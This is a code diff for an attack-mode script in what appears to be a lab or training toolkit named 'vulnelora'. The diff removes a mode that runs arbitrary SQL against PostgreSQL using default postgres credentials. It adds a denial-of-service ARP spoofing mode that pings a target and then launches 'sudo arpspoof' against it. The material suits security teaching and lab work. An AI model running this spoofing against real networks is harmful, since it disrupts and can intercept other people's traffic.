@@ -5,19 +5,17 @@ import os
 import sys
 import json
 import subprocess
+import netifaces
+from pythonping import ping
 
 
 save_flag = 0
 service_path = "/opt/vulnelora"
-lomab_dir = f"{service_path}/resources/LoMAB"
 
 
-attack_config = {'command': "",
-'db_ip': "127.0.0.1",
-'db_port': 5432,
-'db_name': 'postgres',
-'db_user': 'postgres',
-'db_pass': 'postgres'
+attack_config = {'target_ip': "127.0.0.1",
+'spoof_ip': '127.0.0.1',
+'interface': 'eth0'
 }
 
 
@@ -78,6 +76,11 @@ def validate_ip(ip):
     return False
 
 
+def validate_if(interface):
+    interfaces = netifaces.interfaces()
+    return interface in interfaces
+
+
 def argument_parser():
     argument = sys.argv[1]
     base_name, extension = os.path.splitext(argument)
@@ -87,61 +90,33 @@ def argument_parser():
         arg_input = input()
 
         if arg_input == "help":
-            with open(service_path + '/modes/help_messages/direct_sql_injection.txt', 'r') as file:
+            with open(service_path + '/modes/help_messages/dos_arp_spoof.txt', 'r') as file:
                 file_content = file.read()
                 print(file_content)
-        elif "command" in arg_input:
-            tmp_payload = extract(arg_input, "command")
-            if tmp_payload.lower() == "none":
-                attack_config['command'] = ""
-                print(f"\n>> Set argument: command='' (cleared argument)")
+        elif "target_ip" in arg_input:
+            tmp_t_ip = extract(arg_input, "target_ip")
+            if validate_ip(tmp_t_ip):
+                attack_config['target_ip'] = tmp_t_ip
+                print(f"\n>> Set argument: target_ip={tmp_t_ip}")
             else:
-                attack_config['command'] = tmp_payload
-                print(f"\n>> Set argument: command={tmp_payload}")
-        elif "db_ip" in arg_input:
-            tmp_ip = extract(arg_input, "db_ip")
-            if validate_ip(tmp_ip):
-                attack_config['db_ip'] = tmp_ip
-                print(f"\n>> Set argument: db_ip={tmp_ip}")
+                attack_config['target_ip'] = "127.0.0.1"
+                print("\n>> Set argument: target_ip=127.0.0.1 (revert to default value, must be a valid IP address)")
+        elif "spoof_ip" in arg_input:
+            tmp_s_ip = extract(arg_input, "spoof_ip")
+            if validate_ip(tmp_s_ip):
+                attack_config['spoof_ip'] = tmp_s_ip
+                print(f"\n>> Set argument: spoof_ip={tmp_s_ip}")
             else:
-                attack_config['db_ip'] = "127.0.0.1"
-                print("\n>> Set argument: db_ip='127.0.0.1' (default value, must be a valid IP address)")
-        elif "db_port" in arg_input:
-            tmp_port = extract(arg_input, "db_port")
-            try:
-                int_tmp_port = int(tmp_port)
-                if 1 <= int_tmp_port <= 65535:
-                    attack_config['db_port'] = tmp_port
-                    print(f"\n>> Set argument: db_port={tmp_port}")
-                else:
-                    raise ValueError()
-            except ValueError:
-                attack_config['db_port'] = 5432
-                print("\n>> Set argument: db_port=5432 (revert to default value, database port must be from 1 to 65535)")
-        elif "db_name" in arg_input:
-            tmp_name = extract(arg_input, "db_name")
-            if len(tmp_name) > 0:
-                attack_config['db_name'] = tmp_name
-                print(f"\n>> Set argument: db_name={tmp_name}")
+                attack_config['spoof_ip'] = "127.0.0.1"
+                print("\n>> Set argument: spoof_ip=127.0.0.1 (revert to default value, must be a valid IP address)")
+        elif "interface" in arg_input:
+            tmp_if = extract(arg_input, "interface")
+            if validate_if(tmp_if):
+                attack_config['interface'] = tmp_if
+                print(f"\n>> Set argument: interface={tmp_if}")
             else:
-                attack_config['db_name'] = "postgres"
-                print("\n>> Set argument: db_name=postgres (revert to default value, database name is mandatory)")
-        elif "db_user" in arg_input:
-            tmp_user = extract(arg_input, "db_user")
-            if len(tmp_user) > 0:
-                attack_config['db_user'] = tmp_user
-                print(f"\n>> Set argument: db_user={tmp_user}")
-            else:
-                attack_config['db_user'] = "postgres"
-                print("\n>> Set argument: db_user=postgres (revert to default value, database username is mandatory)")
-        elif "db_pass" in arg_input:
-            tmp_pass = extract(arg_input, "db_pass")
-            if len(tmp_pass) > 0:
-                attack_config['db_pass'] = tmp_pass
-                print(f"\n>> Set argument: db_pass={tmp_pass}")
-            else:
-                attack_config['db_pass'] = "postgres"
-                print("\n>> Set argument: db_pass=postgres (default value, database password is mandatory)")
+                attack_config['interface'] = "eth0"
+                print("\n>> Set argument: interface=eth0 (revert to default value, given interface does not exist on this device)")
         elif arg_input == "print":
             print("\n>> Current argument configuration:")
             print_args()
@@ -188,12 +163,15 @@ def argument_parser():
 
 
 def run_attack():
-    print("\n[INFO]: Starting the SQL injection attack...\n")
+    print(f"\n[INFO]: Checking if {attack_config['target_ip']} is reachable...\n")
+    reachable = ping(attack_config['target_ip'], count=5, verbose=True)
 
-    if attack_config['command'] != "":
-        subprocess.run(["psql", f"postgresql://{attack_config['db_user']}:{attack_config['db_pass']}@{attack_config['db_ip']}:{attack_config['db_port']}/{attack_config['db_name']}", "-c", attack_config['command']])
+    if reachable.success():
+        print(f"\n[SUCCESS]: IP address {attack_config['target_ip']} is reachable, starting the attack (stop with Ctrl+c)...\n")
+        subprocess.run(["sudo", "arpspoof", "-i", attack_config['interface'], "-t", attack_config['target_ip'], attack_config['spoof_ip']])
     else:
-        subprocess.run(["psql", f"postgresql://{attack_config['db_user']}:{attack_config['db_pass']}@{attack_config['db_ip']}:{attack_config['db_port']}/{attack_config['db_name']}"])
+        print(f"\n[FAILED]: IP address {attack_config['target_ip']} is not reachable, attack canceled.\n")
+        return
 
 
 if __name__ == "__main__":
